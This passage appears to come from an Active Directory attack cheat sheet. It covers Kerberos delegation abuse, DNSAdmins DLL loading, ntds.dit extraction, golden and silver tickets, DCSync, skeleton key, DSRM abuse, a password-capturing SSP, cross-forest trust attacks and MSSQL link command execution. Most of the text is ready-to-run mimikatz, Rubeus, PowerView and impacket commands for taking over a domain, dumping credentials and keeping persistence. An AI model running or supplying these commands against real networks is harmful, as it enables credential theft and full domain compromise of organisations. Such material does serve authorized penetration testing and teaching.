Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'

ALTERNATIVE: Using Rubeus:

Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt

Now we can access the service as the impersonated user!

🚩 What if we have delegation rights for only a spesific SPN? (e.g TIME):

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.
Resource Based Constrained Delegation

WUT IS DIS?:
TL;DR
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.

Tools we are going to use:

    PowerView
    Powermad
    Rubeus

First we need to enter the security context of the user/machine account that has the privileges over the object. If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$

Detailed Articles:

    Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory
    RESOURCE-BASED CONSTRAINED DELEGATION ABUSE

❗️ In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap

Detailed Article: Rubeus – Now With More Kekeo
DNSAdmins Abuse

WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.

    Enumerate the members of the DNSAdmins group:
        PowerView: Get-NetGroupMember -GroupName "DNSAdmins"
        AD Module: Get-ADGroupMember -Identiny DNSAdmins
    Once we found a member of this group we need to compromise it (There are many ways).
    Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

    #Using dnscmd:
    dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

    #Restart the DNS Service:
    sc \\DNSServer stop dns
    sc \\DNSServer start dns

Abusing Active Directory-Integraded DNS

    Exploiting Active Directory-Integrated DNS
    ADIDNS Revisited
    Inveigh

Abusing Backup Operators Group

WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.

    Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

#Create a .txt file that will contain the shadow copy process script
Script ->{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
}

#Execute diskshadow with our script as parameter
diskshadow /s script.txt

    Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are going to use this amazing repo:

#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
  
#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege
  
#If it isn't we enable it
Set-SeBackupPrivilege
  
#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
  
#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive 

    Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
    Use secretsdump.py from impacket and dump the hashes.
    Use psexec or another tool of your choice to PTH and get Domain Admin access.

Abusing Exchange

    Abusing Exchange one Api call from DA
    CVE-2020-0688
    PrivExchange Exchange your privileges for Domain Admin privs by abusing Exchange

Weaponizing Printer Bug

    Printer Server Bug to Domain Administrator
    NetNTLMtoSilverTicket

Abusing ACLs

    Escalating privileges with ACLs in Active Directory
    aclpwn.py
    Invoke-ACLPwn

Abusing IPv6 with mitm6

    Compromising IPv4 networks via IPv6
    mitm6

SID History Abuse

WUT IS DIS?: If we manage to compromise a child domain of a forest and SID filtering isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the SID History field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.

Exploitation example:

#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all

Detailed Articles:

    Kerberos Golden Tickets are Now More Golden
    A Guide to Attacking Domain Trusts

Exploiting SharePoint

    CVE-2019-0604 RCE Exploitation
    PoC
    CVE-2019-1257 Code execution through BDC deserialization
    CVE-2020-0932 RCE using typeconverters
    PoC

Zerologon Exploit

    Zerologon: Unauthenticated domain controller compromise: White paper of the vulnerability.
    SharpZeroLogon: C# implementation of the Zerologon exploit.
    Invoke-ZeroLogon: Powershell implementation of the Zerologon exploit.
    Zer0Dump: Python implementation of the Zerologon exploit using the impacket library.

Domain Persistence
Golden Ticket Attack

#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

DCsync Attack

#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm

Tip:
/ptt -> inject ticket on current running session
/ticket -> save the ticket on the system for later use
Silver Ticket Attack

Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'

SPN List
Skeleton Key Attack

#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator

DSRM Abuse

WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!

#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose

Then just PTH to get local admin access on DC!
Custom SSP

WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!

From powershell:

#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'

Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log
Cross Forest Attacks
Trust Tickets

WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.

⚠️ The access we will have will be limited to what our DA account is configured to have on the other Forest!

Using Mimikatz:

#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'

❗️ Tickets -> .kirbi format

Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

Using Rubeus:

.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt

Abuse MSSQL Servers

    Enumerate MSSQL Instances: Get-SQLInstanceDomain
    Check Accessibility as current user:

Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

    Gather Information about the instance: Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
    Abusing SQL Database Links:
    WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!

Check for existing Database Links:

#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instace <SPN> -Verbose
     
#MSSQL Query:
select * from master..sysservers

Then we can use queries to enumerate other links from the linked Database:

#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')
     
#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
     
#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"

Query execution:

Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"

Breaking Forest Trusts

WUT IS DIS?:
TL;DR
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.

Tools we are going to use:

    Rubeus
    SpoolSample
    Mimikatz

Exploitation example:

#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all 

Detailed Articles:

    Not A Security Boundary: Breaking Forest Trusts
    Hunting in Active Directory: Unconstrained Delegation & Forests Trusts





